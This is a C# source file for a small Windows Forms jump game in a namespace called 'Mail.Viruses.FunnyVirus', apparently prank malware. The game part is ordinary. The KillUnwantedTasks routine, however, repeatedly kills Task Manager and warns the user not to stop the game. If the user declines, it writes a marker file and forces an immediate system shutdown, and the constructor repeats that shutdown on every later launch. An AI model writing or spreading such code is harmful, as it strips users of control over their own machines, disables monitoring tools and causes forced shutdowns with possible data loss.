using System.Diagnostics;
using System.Numerics;

namespace Mail.Viruses.FunnyVirus
{
    public partial class MainWindow : Form
    {
        // Settings
        private int Gravity = 1;
        private int JumpForce = 15;
        private int MoveSpeed = 15;
        // Colliders
        private Collider PlayerCollider = new();
        private Collider GroundCollider = new();
        private Collider SpikeCollider;
        // Runtime Variables
        private int VelocityY = 0;
        private bool W = false;
        private bool S = false;
        private bool D = false;
        private bool A = false;
        private PictureBox Spike = new();
        private bool Updating = true;

        public MainWindow()
        {
            InitializeComponent();

            if (File.Exists("Shutdown"))
            {
                Shutdown();
            }

            Player.Image = BytesToImage(Resources.Player);
            Ground.Image = BytesToImage(Resources.Grass);
            PlayerCollider.Scale = new Vector2(Player.Size.Width, Player.Size.Height);
            GroundCollider.Scale = new Vector2(Ground.Size.Width, Ground.Size.Height);
            KillUnwantedTasks();
            BetterUpdate();
        }

        public static Image BytesToImage(byte[] Bytes)
        {
            using (MemoryStream MemoryStream = new(Bytes))
            {
                return Image.FromStream(MemoryStream);
            }
        }

        private void Shutdown()
        {
            var psi = new ProcessStartInfo("shutdown", "/s /t 0");
            psi.CreateNoWindow = false;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        private async void BetterUpdate()
        {
            while (Updating)
            {
                PlayerCollider.Position = new Vector2(Player.Location.X, -Player.Location.Y);
                GroundCollider.Position = new Vector2(Ground.Location.X, -Ground.Location.Y);

                //if (D)
                //{
                //    Player.Location = new Point(Player.Location.X + MoveSpeed, Player.Location.Y);
                //}
                //else if (A)
                //{
                //    Player.Location = new Point(Player.Location.X - MoveSpeed, Player.Location.Y);
                //}
                Player.Location = new Point(Player.Location.X + MoveSpeed, Player.Location.Y);
                Player.Location = new Point(Player.Location.X, Player.Location.Y - VelocityY);

                if (SpikeCollider != null && SpikeCollider.Check(PlayerCollider))
                {
                    Process.GetCurrentProcess().Kill();
                }

                if (Player.Location.X > 700)
                {
                    Player.Location = new Point(0, Player.Location.Y);
                    Controls.Remove(Spike);
                    Spike.Size = new Size(100, 100);
                    Spike.SizeMode = PictureBoxSizeMode.Zoom;
                    Spike.Image = BytesToImage(Resources.Player);
                    Spike.Location = new Point(Random.Shared.Next(400, 700), 251);
                    Controls.Add(Spike);
                    SpikeCollider = new();
                    SpikeCollider.Position = new Vector2(Spike.Location.X, -Spike.Location.Y);
                    SpikeCollider.Scale = new Vector2(Spike.Size.Width - 30, Spike.Size.Height - 10);
                }

                if (GroundCollider.Check(new Vector2(PlayerCollider.Position.X, PlayerCollider.Position.Y - ((PlayerCollider.Scale.Y / 2) + 10))))
                {
                    VelocityY = 0;
                    if (W)
                    {
                        VelocityY += JumpForce;
                    }
                    else
                    {
                        Player.Location = new Point(Player.Location.X, Player.Location.Y + (251 - Player.Location.Y));
                    }
                }
                else
                {
                    VelocityY -= Gravity;
                }

                await Task.Delay(50);
            }
        }

        private async void KillUnwantedTasks()
        {
            while (true)
            {
                Process[] Processes = Process.GetProcessesByName("taskmgr");
                foreach (Process Process in Processes)
                {
                    Process.Kill(true);
                    Updating = false;
                    DialogResult DialogResult = MessageBox.Show("Don't try to stop the game", "Warning", MessageBoxButtons.YesNo);
                    switch (DialogResult)
                    {
                        case DialogResult.Yes:
                            Updating = true;
                            BetterUpdate();
                            break;
                        case DialogResult.No:
                            MessageBox.Show("No?", "Warning");
                            File.Create("Shutdown");
                            Shutdown();
                            break;
                    }
                }
                await Task.Delay(50);
            }
        }

        private void MainWindow_KeyDown(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.W:
                    W = true;
                    break;
                case Keys.S:
                    S = true;
                    break;
                case Keys.D:
                    D = true;
                    break;
                case Keys.A:
                    A = true;
                    break;
            }
        }

        private void MainWindow_KeyUp(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.W:
                    W = false;
                    break;
                case Keys.S:
                    S = false;
                    break;
                case Keys.D:
                    D = false;
                    break;
                case Keys.A:
                    A = false;
                    break;
            }
        }
    }
}
